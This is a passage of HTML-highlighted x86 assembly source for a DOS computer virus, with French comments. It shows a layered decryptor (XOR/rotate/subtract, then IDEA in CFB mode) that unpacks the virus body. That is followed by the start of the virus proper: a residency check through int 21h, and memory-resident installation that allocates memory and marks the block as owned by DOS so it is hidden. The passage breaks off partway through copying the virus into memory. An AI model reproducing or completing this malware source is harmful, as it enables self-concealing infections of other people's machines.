</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">fin_cryptage_NOKEY</span><span class="sc4">-</span><span class="sc5">debut_cryptage_NOKEY</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc1">;par la routine précédente</span><span class="sc0">
</span><span class="sc5">decrypte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decrypte_ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decrypte</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">debut_cryptage_NOKEY</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;---------------routine de decryptage de ax avec les clefs actuelles----------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">decrypte_ax</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor2</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;avec les mêmes clefs</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor2</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;avec les mêmes clefs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_ror</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_sub</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_sub</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_xor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">debut_cryptage_NOKEY</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;******************************************************************</span><span class="sc0">
</span><span class="sc1">;                       COUCHE DE CRYPTAGE IDEA                   *</span><span class="sc0">
</span><span class="sc1">;******************************************************************</span><span class="sc0">

</span><span class="sc1">;----------merdouille pour la generation 0------------------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">test_IDEA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;pour gen0</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069B8h</span><span class="sc0">                                  </span><span class="sc1">;si pas crypté</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">suite3</span><span class="sc0">                              </span><span class="sc1">;on va directos au début</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">debut_cryptage_IDEA</span><span class="sc0">
</span><span class="sc5">suite3</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;-------------mettre random seed dans xbuffer----------------------</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">iv</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;iv=sorte de random seed</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xBuffer</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;on le deplace</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;4 words</span><span class="sc0">
</span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc1">;---------sauver offset debut pour apres decryptage------------------</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage_IDEA</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;offset debut a garder</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                                         </span><span class="sc1">;pour le ret final</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">saute_clef</span><span class="sc0">
</span><span class="sc5">Key2</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">52d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0ADDEh</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">saute_clef</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;----------calculer nombre de blocs a decrypter----------------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage_IDEA</span><span class="sc4">-</span><span class="sc5">debut_cryptage_IDEA</span><span class="sc0">   </span><span class="sc1">;nb d'octets a decrypter</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">;on ajuste taille a l'octet suivant</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;on divise par 8</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;taille octets lus /8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;donc nb de blocs de 8 oct a crypter</span><span class="sc0">

</span><span class="sc1">;------------------decryptage---------------------------------</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage_IDEA</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;offset debut pour cryptage</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ou_est_la_clef</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">;0=zone basse</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">block</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key2</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;offset clef 52</span><span class="sc0">
    
</span><span class="sc5">Block</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;sauve cx, si, di</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">Decrypt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">xBuffer</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; di-&gt;buffer</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IDEA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; si-&gt;buffer</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; di-&gt;data</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">DeFeedback</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">DeFeedback</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> 
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">;recup cx, si, di</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">;passe au bloc suivant</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Block</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;pour revenir au debut du virus</span><span class="sc0">

</span><span class="sc1">;-------------------routine IDEA--------------------------------</span><span class="sc0">
</span><span class="sc1">; IDEA with CFB assembly implementation</span><span class="sc0">
</span><span class="sc1">; Written by Fauzan Mirza &lt;F.U.Mirza@sheffield.ac.uk&gt;</span><span class="sc0">
</span><span class="sc1">; si -&gt; key, di -&gt; data</span><span class="sc0">

</span><span class="sc5">x0</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">x1</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">x2</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">x3</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">t0</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                      </span><span class="sc1">;!!!!!!!!ARGGGGGHHH!!!!!</span><span class="sc0">
</span><span class="sc5">t1</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">IDEA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">Round</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">x0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MulMod</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">x0</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">x1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">x2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">x3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MulMod</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">x3</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">t0</span><span class="sc4">,</span><span class="sc5">x1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">t1</span><span class="sc4">,</span><span class="sc5">x2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">x0</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">x2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">x3</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">x1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">x2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MulMod</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">x2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">x1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">x1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MulMod</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">x1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc5">x2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">x1</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">x0</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">x2</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">x3</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">x1</span><span class="sc4">,</span><span class="sc5">t1</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc5">x2</span><span class="sc4">,</span><span class="sc5">t0</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Round</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">x0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MulMod</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">x0</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">x2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">x1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">x1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">x2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">x3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MulMod</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">x3</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------Multiplication modulo 63337----------------------</span><span class="sc0">
</span><span class="sc1">; ax = (-&gt;si) * dx</span><span class="sc0">

</span><span class="sc5">MulMod</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NotZero</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">MulDone</span><span class="sc0">
</span><span class="sc5">NotZero</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MulDone</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------zones de donnees de IDEA----------------------</span><span class="sc0">

</span><span class="sc5">xBuffer</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0BBh</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">IV</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">9d73h</span><span class="sc4">,</span><span class="sc2">1a08h</span><span class="sc4">,</span><span class="sc2">0f25eh</span><span class="sc4">,</span><span class="sc2">0b46ch</span><span class="sc0">
</span><span class="sc5">ou_est_la_clef</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Key1</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">52</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0ADDEh</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">debut_cryptage_IDEA</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;******************************************************************</span><span class="sc0">
</span><span class="sc1">;                       DEBUT DU VIRUS            *</span><span class="sc0">
</span><span class="sc1">;******************************************************************</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc1">;************* test si le programme est deja resident ******************</span><span class="sc0">

</span><span class="sc5">test_IDEA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6969h</span><span class="sc0">           </span><span class="sc1">;int21 avec 6969h      !!!avec 9999h, flag U!!!     </span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">;test si MON in21 est en place </span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">696Ah</span><span class="sc0">           </span><span class="sc1">;si elle est la, elle retourne un ax egal a 696Ah</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">va_resident</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">deja_installe</span><span class="sc0">       </span><span class="sc1">;oui =&gt; on arrete     </span><span class="sc0">

</span><span class="sc1">;********************* installation en TSR ***************************</span><span class="sc0">

</span><span class="sc5">va_resident</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4a00h</span><span class="sc0">                   </span><span class="sc1">;connaitre memoire libre</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">;retour bx=memoire-taille max                                       </span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">)*</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;soustraire ce dont on a besoin (bx=paragraphes voulus) </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4a00h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">;retour es=segment bloc libre</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4800h</span><span class="sc0">                   </span><span class="sc1">;allouer la memoire</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">)*</span><span class="sc2">3</span><span class="sc0">       
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                     </span><span class="sc1">;retour ax=segment libre</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                      </span><span class="sc1">;es pointe vers </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                   </span><span class="sc1">;la nouvelle</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                      </span><span class="sc1">;MCB</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">                     </span><span class="sc1">;le marquer comme le dernier </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                      </span><span class="sc1">;proprietaire=dos                               </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
